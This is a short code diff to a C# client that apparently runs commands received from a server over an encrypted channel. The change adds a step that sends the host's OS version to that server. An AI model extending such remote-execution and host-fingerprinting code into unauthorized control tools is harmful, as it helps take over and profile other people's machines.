@@ -1,5 +1,6 @@
 ﻿using Client_side;
 using System.Net.Sockets;
+using System.Text;
 
 public class Program
 {
@@ -30,6 +31,10 @@ public class Program
         NetworkLayer.SendPublicKey();
         string passPhrase = NetworkLayer.ReceivePassPhrase();
         Encryptor encryptor = new(passPhrase.Trim());
+
+        // Send OS Version
+        string osVersion = Environment.OSVersion.ToString();
+        NetworkLayer.SendResult(Encoding.UTF8.GetBytes(osVersion));
 
         // Loop to receive commands from the server and execute them then send the result back
         while (true)
